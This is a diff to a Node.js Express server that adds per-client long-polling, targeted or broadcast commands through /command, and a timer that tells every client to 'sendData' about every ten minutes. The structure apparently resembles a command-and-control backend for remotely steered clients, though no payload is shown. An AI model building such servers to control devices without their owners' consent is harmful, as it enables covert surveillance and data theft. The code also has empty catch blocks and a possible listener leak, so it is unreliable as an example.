@@ -35,30 +35,43 @@ server.post("/data", (req, res) => {
 });
 
 server.get("/longpull", (req, res) => {
-  let sent = false;
+  const clientId = req.query.id;
+  if (!clientId) return res.status(400).json({ error: "Client ID is required" });
 
   const timeout = setTimeout(() => {
-    if (!sent) {
-      sent = true;
+    try{
       res.status(204).end();
+      emitter.removeListener(`getdata:${clientId}`, sendMes);
+    }catch{
+
     }
+
   }, 300000); 
 
-  const sendMes = (message) => {
-    if (!sent) {
-      sent = true;
+  var sendMes = (message) => {
+    try{
+      if (res.headersSent) return; 
       clearTimeout(timeout);
       res.json(message);
+    } catch{
     }
   };
 
   emitter.once('getdata', sendMes);  
+  emitter.once(`getdata:${clientId}`,sendMes)
 });
 
+setInterval(() => emitter.emit('getdata', { action: "sendData" }), 610000);
+
 server.post("/command", (req, res) => {
-  const {action} = req.body;
-  emitter.emit('getdata', {action});
-  res.status(200).send("OK");
+  const {clientId, action} = req.body;
+  if(clientId === "all"){
+    emitter.emit('getdata', {action});
+  }else{
+    emitter.emit(`getdata:${clientId}`, {action});
+  }
+   
+   res.status(200).send("OK");
 });
 
 server.get("/getLogs", (req, res) => {
